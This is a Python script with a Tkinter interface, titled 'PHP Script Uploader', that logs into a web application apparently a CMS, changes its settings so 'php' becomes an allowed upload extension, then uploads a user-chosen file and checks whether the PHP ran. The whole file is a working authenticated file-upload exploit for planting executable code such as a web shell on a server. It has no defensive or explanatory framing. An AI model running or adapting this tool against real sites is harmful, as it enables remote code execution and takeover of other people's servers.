import argparse
import requests
import certifi
import getpass
import os
import re
import json
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import filedialog, messagebox

def is_php_executed(response_text):
    try:
        response_json = json.loads(response_text)
        if "execution_result" in response_json and response_json["execution_result"]:
            return True
    except json.JSONDecodeError:
        try:
            soup = BeautifulSoup(response_text, 'html.parser')
            status_div = soup.find('div', id='execution-status')
            if status_div and 'Execution Successful' in status_div.text:
                return True
        except Exception as e:
            print("Error parsing HTML:", e)
            return False
    return False

def login_and_upload(url, username, password, file_path):
    session = requests.Session()
    session.verify = certifi.where()

    login_data = {
        "username": username,
        "password": password
    }

    response = session.post(url, data=login_data, allow_redirects=False)
    if response.status_code == 302:
        print("Login successful, redirecting to:", response.headers.get('Location'))
    else:
        print("Login failed")
        return "Login failed"

    if not os.path.isfile(file_path):
        print("File does not exist")
        return "File does not exist"

    file_size = os.path.getsize(file_path)
    settings_data = {
        "p": "settings",
        "save": "Save",
        "allowed_not_image_extensions": "php"
    }

    try:
        settings_response = session.post(url, data=settings_data)
        if settings_response.status_code != 200:
            print("Failed to set settings:", settings_response.status_code, settings_response.text)
            return f"Failed to set settings: {settings_response.status_code}"
    except requests.exceptions.RequestException as e:
        print("Failed to set settings:", e)
        return f"Failed to set settings: {e}"

    upload_data = {
        "action": "upload",
        "file": (os.path.basename(file_path), open(file_path, "rb")),
        "MAX_FILE_SIZE": file_size
    }

    try:
        upload_response = session.post(f"{url}?p=pages&a=new", files=upload_data)
        if upload_response.status_code != 200:
            print("File upload failed:", upload_response.status_code, upload_response.text)
            return f"File upload failed: {upload_response.status_code}"
    except requests.exceptions.RequestException as e:
        print("File upload failed:", e)
        return f"File upload failed: {e}"

    try:
        execution_result = is_php_executed(upload_response.text)
    except json.JSONDecodeError:
        print("Failed to parse response as JSON:", upload_response.text)
        return "Failed to parse response as JSON"
    except Exception as e:
        print("Failed to parse response:", e)
        return f"Failed to parse response: {e}"

    if execution_result is True:
        print("PHP script executed successfully.")
        return "PHP script executed successfully."
    else:
        print("PHP script execution failed.")
        return "PHP script execution failed."

def select_file():
    file_path = filedialog.askopenfilename()
    file_entry.delete(0, tk.END)
    file_entry.insert(0, file_path)

def submit_form():
    url = url_entry.get()
    username = username_entry.get()
    password = password_entry.get()
    file_path = file_entry.get()
    result = login_and_upload(url, username, password, file_path)
    messagebox.showinfo("Result", result)

app = tk.Tk()
app.title("PHP Script Uploader")

tk.Label(app, text="URL").grid(row=0, column=0)
url_entry = tk.Entry(app, width=50)
url_entry.grid(row=0, column=1)

tk.Label(app, text="Username").grid(row=1, column=0)
username_entry = tk.Entry(app, width=50)
username_entry.grid(row=1, column=1)

tk.Label(app, text="Password").grid(row=2, column=0)
password_entry = tk.Entry(app, width=50, show="*")
password_entry.grid(row=2, column=1)

tk.Label(app, text="File").grid(row=3, column=0)
file_entry = tk.Entry(app, width=50)
file_entry.grid(row=3, column=1)
tk.Button(app, text="Browse", command=select_file).grid(row=3, column=2)

tk.Button(app, text="Upload", command=submit_form).grid(row=4, column=0, columnspan=3)

app.mainloop()
